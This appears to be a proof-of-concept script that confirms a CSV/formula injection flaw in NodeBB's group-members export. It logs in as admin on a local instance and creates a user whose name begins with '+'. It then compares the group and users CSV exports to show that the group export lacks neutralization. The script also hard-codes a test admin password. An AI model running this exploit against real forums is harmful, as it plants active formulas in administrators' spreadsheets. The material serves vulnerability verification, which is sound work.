#!/usr/bin/env python3
r"""
VULN-010 — CSV/formula injection in group-members export (missing neutralizeCsvFormula)
=======================================================================================

Vulnerable code (targets/NodeBB/):
  * src/controllers/admin/groups.js:97-105  group export builds CSV from raw email/username/uid cells
                                             with NO neutralizeCsvFormula (regression)
  * src/user/admin.js:91,106-110            the USERS export DOES neutralize (the sibling) — the model

Vulnerability class: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File).

Flaw (plain English):
  When an admin exports a group's members to CSV, NodeBB writes the email/username/uid cells verbatim.
  An unprivileged user whose username begins with a formula trigger (=, +, -, @) therefore lands an
  active formula in the admin's spreadsheet. NodeBB's USERS export neutralizes exactly this (prefixes a
  cell matching /^[\t\r ]*[=+\-@]/ with an apostrophe), so the group export is a regression.
  Usernames permit leading + and - (isUserNameValid), so a self-registered user is enough.

Exploitation idea:
  Create a user whose username starts with '+' (a formula trigger that passes isUserNameValid), add it to
  a group, then export BOTH the group CSV and the users CSV as admin and compare the same member's cell.

What a successful run proves:
  In the GROUP CSV the member's username cell begins with '+' (an un-neutralized formula), while in the
  USERS CSV the identical username is prefixed with an apostrophe ('+...) — demonstrating the group
  export omits the neutralization its sibling applies.
"""
import os
import sys
import csv
import io
import secrets
import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21372")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "NodeBB-Adm1n-Sec2026!")
TIMEOUT = 15
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


def admin_session():
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def find_username_cell(csv_text, needle):
    """Return the raw username cell that contains `needle`, else None."""
    reader = csv.DictReader(io.StringIO(csv_text))
    for row in reader:
        for key in row:
            if key and key.strip().lower() == "username" and row[key] and needle in row[key]:
                return row[key]
    # fallback: header may vary; scan all cells
    reader = csv.reader(io.StringIO(csv_text))
    for row in reader:
        for cell in row:
            if needle in cell:
                return cell
    return None


def main():
    print("=" * 78)
    print("VULN-010: CSV/formula injection in group-members export (missing neutralizeCsvFormula)")
    print(f"Target: {BASE_URL}")
    print("=" * 78)
    log("INFO", "group export omits neutralizeCsvFormula (src/controllers/admin/groups.js:97-105); "
                "users export applies it (src/user/admin.js:106-110)")

    suffix = secrets.token_hex(4)
    # leading '+' is a formula trigger AND passes isUserNameValid (which allows + and -)
    payload_user = f"+HYPERLINK_{suffix}"
    group_name = f"csvgrp_{suffix}"

    s, csrf = admin_session()
    hdr = {"x-csrf-token": csrf, "Content-Type": "application/json"}

    log("SETUP", f"creating unprivileged user with formula-triggering username: {payload_user!r}")
    r = s.post(f"{BASE_URL}/api/v3/users", headers=hdr,
               json={"username": payload_user, "password": f"Pw-{secrets.token_hex(8)}!"}, timeout=TIMEOUT)
    if r.status_code not in (200, 201):
        log("FAIL", f"user create failed: {r.status_code} {r.text[:160]}")
        sys.exit(1)
    uid = r.json()["response"]["uid"]
    stored_username = r.json()["response"]["username"]
    log("SETUP", f"created uid={uid}, stored username={stored_username!r}")

    log("SETUP", f"creating group {group_name} and adding the user")
    r = s.post(f"{BASE_URL}/api/v3/groups", headers=hdr, json={"name": group_name}, timeout=TIMEOUT)
    if r.status_code not in (200, 201):
        log("FAIL", f"group create failed: {r.status_code} {r.text[:160]}")
        sys.exit(1)
    slug = r.json()["response"].get("slug", group_name)
    r = s.put(f"{BASE_URL}/api/v3/groups/{slug}/membership/{uid}", headers=hdr, timeout=TIMEOUT)
    log("INFO", f"add-member HTTP {r.status_code}")

    # ---- export the GROUP CSV (vulnerable) ----
    log("STEP", f"admin GET /api/admin/groups/{group_name}/csv")
    # getCSV requires a Referer under /admin/manage/groups (src/controllers/admin/groups.js:87)
    g = s.get(f"{BASE_URL}/api/admin/groups/{group_name}/csv",
              headers={"x-csrf-token": csrf, "Referer": f"{BASE_URL}/admin/manage/groups"}, timeout=TIMEOUT)
    with open(os.path.join(os.path.dirname(__file__), "group_members.csv"), "w") as f:
        f.write(g.text)
    group_cell = find_username_cell(g.text, f"HYPERLINK_{suffix}")
    log("INFO", f"group CSV username cell = {group_cell!r}")

    # ---- export the USERS CSV (neutralized sibling) for contrast ----
    log("STEP", "admin GET /api/admin/users/csv (the sibling that DOES neutralize)")
    u = s.get(f"{BASE_URL}/api/admin/users/csv", headers={"x-csrf-token": csrf}, timeout=TIMEOUT)
    with open(os.path.join(os.path.dirname(__file__), "users.csv"), "w") as f:
        f.write(u.text)
    users_cell = find_username_cell(u.text, f"HYPERLINK_{suffix}")
    log("INFO", f"users CSV username cell = {users_cell!r}")

    print("-" * 78)
    group_is_formula = bool(group_cell) and group_cell.lstrip().startswith(("+", "-", "=", "@"))
    users_neutralized = bool(users_cell) and users_cell.lstrip().startswith("'")

    if group_is_formula:
        log("PROOF", f"the GROUP CSV emits the username cell {group_cell!r} beginning with a formula "
                     "trigger and NOT prefixed with an apostrophe -> a spreadsheet interprets it as a formula")
        if users_neutralized:
            log("PROOF", f"contrast: the USERS CSV neutralizes the same value as {users_cell!r} (leading ') "
                         "-> the group export is a regression that omits neutralizeCsvFormula")
        log("OK", "exploit confirmed — group-members CSV export is vulnerable to formula/CSV injection")
        v = "==> VULN-010: CONFIRMED — group-members CSV export omits formula neutralization"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)

    log("FAIL", f"group CSV cell not an un-neutralized formula (cell={group_cell!r})")
    v = "==> VULN-010: FAILED — group CSV did not contain an un-neutralized formula cell"
    print(f"\033[1;31m{v}\033[0m" if _USE_COLOR else v)
    sys.exit(1)


if __name__ == "__main__":
    main()
